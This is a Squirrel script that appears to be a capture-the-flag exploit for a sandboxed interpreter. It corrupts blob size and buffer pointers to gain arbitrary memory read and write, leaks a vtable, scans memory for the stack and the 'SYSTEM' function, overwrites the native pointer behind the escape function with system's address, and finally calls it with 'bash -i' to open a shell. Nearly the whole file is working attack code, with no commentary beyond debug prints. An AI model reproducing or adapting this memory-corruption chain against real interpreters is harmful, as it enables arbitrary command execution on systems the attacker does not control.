local OT_INTEGER = 0x5000002;
local OT_NATIVECLOSURE = 0x8000200;

function stack1024();
function stack2048();
function debugtrap(...) {}

function setMinus8(x) {
  return x;
}

# make blob allocations after stack
local blobs = array(1000)
for(local i = 0; i < blobs.len(); ++i) {
  blobs[i] = blob(0x20);
}
local buffer = blob(0x20);
local victim = blob(0x20)

# increase stack 
# after this, the stack should be located right after the last blob
stack2048()

# grow the blob buffer by overwritting capacity
setMinus8(1000);
victim.writen(0, 'c')
printf("size %d\n", victim.len())

# move backward, leak vtable base
setMinus8(-0x40)
debugtrap(victim)
local vtable = victim.readn('l')
printf("vtable %#x\n", vtable)

# try to find another blob that we can control
local idx = -0x40
while (true) {
      idx -= 0x8;
      setMinus8(idx);
      if (victim.readn('l') == vtable) {
      break
      }
}
printf("found buffer blob at offset -%#x\n", -idx)

# update the size
victim.writen( 0x1337, 'l')
printf("buffer size %x\n", buffer.len())

# now we can control the victim more easily using buffer
# find the victim inside the buffer block
while (true) {
      if (buffer.readn('l') == vtable) break;
}
local victimIdx = buffer.tell();
buffer.seek(victimIdx + 0x18)
local victimBuf = buffer.readn('l')
printf("found victim: offset %#x, buf %#x\n ", victimIdx, victimBuf);

function setaddr(addr) {
  buffer.seek(victimIdx);
  buffer.writen(0x1000, 'l'); # size
  buffer.writen(0x1000, 'l'); # allocated
  buffer.writen(0, 'l'); # ptr
  buffer.writen(addr, 'l'); # buf
}

function read(addr) {
  setaddr(addr);
  return victim.readn('l');
}

function readc(addr) {
  setaddr(addr);
  return victim.readn('c');
}

function write(addr, v) {
  setaddr(addr);
  return victim.writen(v, 'l');
}

# find the stack
function findChars(addr, str) {
  while (true) {
    local found = true;
    foreach (i,c in str) {
      if (readc(addr + i) != (c ^ 0x20)) {
        found = false;
        break;
      };
    }
    if (found) break;

    addr++;
  }
  return addr;
}

function findAlignedQWord(addr, v) {
  while (read(addr) != v) {
    addr += 8;
  }
  return addr;
}

function findObject(addr, type) {
  return findAlignedQWord(addr, type)
}

function findIntegerObj(addr, val) {
  while (read(addr) != OT_INTEGER || read(addr + 8) != val) {
    addr += 8;
  }
  return addr;
}


local marker = 0x13371337;
local stackAddr = findIntegerObj(victimBuf, marker);
printf("found stack at %#x\n", stackAddr);

function getObject(addr) {
  local hole = 0x1287912830;
  local holeAddr = findIntegerObj(stackAddr, hole);
  hole = read(addr + 8);
  write(holeAddr, read(addr));
  return hole;
}

local escape_func = escape;
local escape_nc = read(findObject(stackAddr, OT_NATIVECLOSURE) + 8);
local escape_faddr = read(escape_nc + 0x68)
printf("escape nativeclosure %#x func %#x\n", escape_nc, escape_faddr);

// search for SYSTEM func (note: all caps to not cause false references)
local SYSTEM_STR = findChars(escape_faddr, "SYSTEM")
printf("SYSTEM str: %#x\n", SYSTEM_STR);

local strRef = findAlignedQWord(vtable & ~0xfff, SYSTEM_STR);
printf("str ref at: %#x\n", strRef);
local SYSTEM_ADDR = read(strRef + 8)
printf("SYSTEM at: %#x\n", SYSTEM_ADDR);

// replace escapeFunc ref
write(escape_nc + 0x68, SYSTEM_ADDR)
escape_func("bash -i 2>&1")


debugtrap(escape_func)
